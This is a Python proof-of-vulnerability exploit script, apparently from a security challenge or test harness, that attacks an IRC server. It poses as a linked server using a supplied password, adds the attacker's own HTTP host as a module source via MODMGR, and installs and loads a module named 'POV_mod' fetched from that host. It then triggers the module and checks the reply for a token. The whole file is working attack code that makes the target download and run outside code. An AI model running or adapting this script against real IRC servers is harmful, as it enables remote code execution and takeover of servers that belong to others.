import sys
import requests
from pwn import *
import binascii
import time
import subprocess
import os
import socket

DEBUG = 0

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
         IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def password(p, password):
    data = 'PASS ' + password + '\r\n'
    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192,8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response ' + resp[:-2] + '\n')

def user(p, username, hostname, servername, realname):
    data = 'USER ' + username + ' ' + hostname + ' ' + servername + ' :' + realname + '\r\n'
    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192,8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response ' + resp[:-2] + '\n')

def uid(p, nickname, username, hostname):
    data = 'UID ' + nickname + ' 1 ' + str(time.time()) + ' ' + username + ' ' + hostname + ' 999AAAAAA 0 +iwx * * * :Rick, Rick Astley\r\n' 

    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192,8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response ' + resp[:-2] + '\n')


def protoctl(p):
    data = 'PROTOCTL EAUTH=irc.other.org SID=999\r\n'
    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192,8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response' + resp[:-2] + '\n')

    data = 'PROTOCTL NOQUIT NICKv2 SJOIN SJ3 CLK TKLEXT TKLEXT2 NICKIP ESVID MLOCK EXTWHOIS\r\n'
    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192,8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response' + resp[:-2] + '\n')

def server(p):
    data = 'SERVER irc.other.org 1 :server a pretty cool server\r\n'
    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192,8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response' + resp[:-1] + '\n')

def eos(p):
    data = 'EOS\r\n'
    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2])
    p.send(data)

    resp = str(p.recv(8192,8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response' + resp[:-1] + '\n')

def modmgr(p, command, module):
    data = 'MODMGR local' + ' ' + command + ' ' + module + '\r\n'
    if DEBUG == 1:
        print('[POV] Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192, 8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Modmgr Response' + resp[:-2] + '\n')

def boom(p):
    data = 'BOOM\r\n'
    token = os.environ['TOKEN']

    if DEBUG == 1:
        print('Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192, 8).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Final Response' + resp[:-2] + '\n')

    if token in resp:
        print('POV SUCCESS')
    else:
        print('POV FAILED')

def rehash(p):
    data = 'REHASH\r\n'
    if DEBUG == 1:
        print('Sending ' + data[:-2] + '\n')
    p.send(data)

    resp = str(p.recv(8192, 10).decode('utf-8'))
    if DEBUG == 1:
        print('[POV] Response' + resp[:-2] + '\n')

def spoof_server(p):
    print('\n[POV] Spoofing IRC Server')
    passw = os.environ['PASS']

    password(p, passw)
    protoctl(p)
    server(p)
    eos(p)
    uid(p,'malicious', 'mal_user' , get_ip())

    print('[POV] Adding http://'+ get_ip() + '/modules.list to modules.sources.list')
    modmgr(p, 'add_source', 'http://' + get_ip()  + '/modules.list')
    sleep(15)

    print('[POV] Installing POV_mod on IRC Server')
    modmgr(p, 'install', 'third/POV_mod')
    sleep(5)

    print('[POV] Rehashing\n')
    rehash(p) 
    sleep(15)

    boom(p)
    p.close()

def main():
    if len(sys.argv) > 3:
        print('[ERROR] Too many arguments')

    elif len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    
        print('HOST: ' + HOST)
        print('PORT: ' + str(PORT))

    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables')
            sys.exit(1)

    with open("modules.list", "r") as f:
        lines = f.readlines()
    with open("modules.list", "w") as f:
        for line in lines:
            if 'source' in line:
                f.write('\tsource \"http://' + get_ip() + '/POV_mod.c\";\n')
                continue 
            f.write(line)

    n = os.fork()

    if n > 0:
        print('STARTING HTTP SERVER\n')
        subprocess.call(['python3','pov_server.py'])
    
    else:
        p = remote(HOST, PORT)
        spoof_server(p)

if __name__ == '__main__':
    main()
